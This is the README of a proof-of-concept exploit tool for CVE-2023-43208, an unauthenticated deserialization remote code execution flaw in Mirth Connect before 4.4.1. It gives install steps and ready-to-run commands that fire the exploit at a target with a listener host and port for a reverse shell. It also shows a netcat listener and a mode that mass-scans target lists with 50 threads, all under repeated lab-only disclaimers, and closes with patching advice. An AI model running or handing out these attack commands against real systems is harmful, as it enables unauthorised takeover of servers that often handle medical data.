# CVE-2023-43208-EXPLOIT
## Mirth Connect Remote Code Execution (RCE) Exploit

![Python Version](https://img.shields.io/badge/python-3.7%2B-blue)
![Version](https://img.shields.io/badge/version-1.0-red)
![CVE](https://img.shields.io/badge/CVE-2023--43208-critical)
![Lab Use Only](https://img.shields.io/badge/use-lab%20only-orange)

> ⚠️ **FOR EDUCATIONAL AND LAB USE ONLY** ⚠️

A proof-of-concept exploit for CVE-2023-43208, a remote code execution vulnerability in Mirth Connect before version 4.4.1.

## 🚨 IMPORTANT LEGAL DISCLAIMER

**This tool is strictly for:**
- 🧪 **Educational purposes**
- 🔬 **Authorized security testing in lab environments**
- 📚 **Cybersecurity research and learning**

**DO NOT USE:**
- ❌ Against systems you don't own
- ❌ Without explicit written permission
- ❌ In production environments
- ❌ For illegal or malicious purposes

**You are responsible for complying with all applicable laws and regulations. Misuse of this tool may result in criminal charges.**

## 📋 Description

This exploit targets the XML deserialization vulnerability in Mirth Connect's `/api/users` endpoint, allowing unauthenticated remote code execution on affected versions (< 4.4.1). 

**This is a CRITICAL vulnerability and should ONLY be tested in isolated lab environments with your own systems.**

## 🔧 Requirements

- Python 3.7 or higher
- Required packages listed in `requirements.txt`
- **A LAB ENVIRONMENT** with vulnerable Mirth Connect instance

## 🚀 Installation

```bash
# Clone the repository
git clone https://github.com/M0h4/CVE-2023-43208-EXPLOIT.git
cd CVE-2023-43208-EXPLOIT

# Install requirements
pip install -r requirements.txt
💻 Usage (LAB USE ONLY)
Interactive Mode (Recommended for Lab)
bash
python exploit.py
Command Line Mode
bash
# Single target exploitation (LAB USE ONLY)
python exploit.py -u https://target:8443 -lh 10.10.14.5 -lp 4444

# Scan multiple targets from file (LAB USE ONLY)
python exploit.py -f targets.txt -t 50 -o vulnerable.txt

# Non-interactive mode (LAB USE ONLY)
python exploit.py -u https://target:8443 -lh 10.10.14.5 -lp 4444 --no-interactive
Options
text
-u, --url       Target URL to exploit (LAB USE ONLY)
-lh, --lhost    Listening host (your IP)
-lp, --lport    Listening port
-f, --file      File containing target URLs to scan
-o, --output    Output file for saving scan results
-t, --threads   Number of threads for scanning (default: 50)
--no-interactive Run in non-interactive mode
🎯 Lab Environment Example
Set up your lab:

Install vulnerable Mirth Connect version (< 4.4.1) in isolated VM

Use controlled network (e.g., NAT/Host-only in VirtualBox/VMware)

Never expose to internet

Start your listener:

bash
ncat -lnvp 4444
# or
nc -lnvp 4444
Run the exploit in your lab:

bash
python exploit.py -u https://192.168.1.100:8443 -lh 192.168.1.50 -lp 4444
🧪 Test Environment Requirements
Isolated network/VLAN

Virtual machines only

No production data

Firewall rules blocking external access

Proper authorization documented

📝 Technical Details
Vulnerability Type: XML Deserialization RCE

Affected Versions: Mirth Connect < 4.4.1

Fixed Version: 4.4.1 and above

CVSS Score: 9.8 (Critical)

Attack Vector: Network

Authentication: None required

The exploit uses Commons Collections gadgets to achieve RCE through the /api/users endpoint.

🛡️ Protection Measures
If you're running Mirth Connect:

✅ Update to version 4.4.1 or later

✅ Restrict network access to admin interfaces

✅ Implement proper authentication

✅ Monitor for suspicious XML payloads

👥 Credits
Original Authors: K3ysTr0K3R & Chocapikk

Modified by: M0h4

CVE: CVE-2023-43208

⚠️ FINAL WARNING

╔══════════════════════════════════════════════════════════════╗
║  THIS TOOL IS FOR LAB USE ONLY                               ║
║  Unauthorized use is ILLEGAL and UNETHICAL                   ║
║  You assume ALL risk and liability                           ║
║  The author accepts NO responsibility for misuse            ║
╚══════════════════════════════════════════════════════════════╝